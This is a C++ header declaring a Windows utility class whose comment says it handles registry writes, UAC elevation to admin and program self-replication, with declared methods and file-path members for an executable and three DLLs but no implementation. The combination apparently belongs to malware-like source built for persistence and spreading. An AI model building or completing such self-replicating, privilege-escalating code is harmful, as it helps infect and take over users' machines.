/*contains functions for winAPI registry operations
 *contains functions for elevating UAC to admin level
 *contains functions for program file self replication 
 */
#ifndef ADVANCED_UTILITIES_H
#define ADVANCED_UTILITIES_H


#include <windows.h>
#include <string>
#include <tchar.h>

class Advanced_Utilities
{
	public:
		bool Am_I_Registered(PCWSTR pszAppName) const;
		std::string Replicate_Self();
		bool Write_To_Registry();
		void Copy_Files_To() const;
		void ReCompute_FilePath(std::string& filepath_to_exe);
		
	private:
	
		DWORD fpathlen;
		TCHAR fszPath[MAX_PATH];
		std::string fexe_filename,fexe_filepath;
		std::string fdll_filename_01,fdll_filepath_01;
		std::string fdll_filename_02,fdll_filepath_02;
		std::string fdll_filename_03,fdll_filepath_03;
};

#endif //ADVANCED_UTILITIES_H
